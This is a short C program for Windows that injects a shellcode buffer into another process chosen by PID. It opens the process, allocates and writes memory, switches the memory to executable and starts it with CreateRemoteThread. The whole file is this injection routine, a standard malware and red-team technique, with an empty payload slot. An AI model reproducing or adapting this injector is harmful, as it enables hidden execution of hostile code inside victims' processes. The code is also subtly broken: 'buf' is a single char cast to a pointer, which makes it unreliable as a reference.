#include <Windows.h>
#include <stdio.h>

unsigned char buf = {};
BOOL rv;

int main(int argc, char* argv[]) {

    if (argc != 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        return 1;
    }

    int pid = atoi(argv[1]);
    printf("Target PID: %d\n", pid);

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);    

    if (hProcess == INVALID_HANDLE_VALUE || hProcess == NULL) {
        printf("Failed to open handle to process with PID %d: Error: %lu\n", pid, GetLastError());
        return -1;
    }
    printf("Successfully opened handle to process with PID %d: %p", pid, hProcess);

    LPVOID exec_mem = VirtualAllocEx(hProcess, NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (exec_mem == NULL) return -1;
    printf("Memory allocated succesfully at address: %p\n", exec_mem);

    SIZE_T bytesWritten = 0;
    rv = WriteProcessMemory(hProcess, exec_mem, (void*) buf, sizeof(buf), &bytesWritten);

    if (rv == 0 || bytesWritten != sizeof(buf)) return -1;
    printf("Wrote %zu bytes to allocated memory.\n", bytesWritten);

    DWORD oldprotect = 0;
    rv = VirtualProtectEx(hProcess, exec_mem, sizeof(buf), PAGE_EXECUTE_READ, &oldprotect);

    if (rv != 0) {
        DWORD threadID;
        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, &threadID);

        if (hThread == NULL) return -1;
        printf("Thread created successfully with ID: %lu\n", threadID);

        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }

    VirtualFreeEx(hProcess, exec_mem, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return 0;
}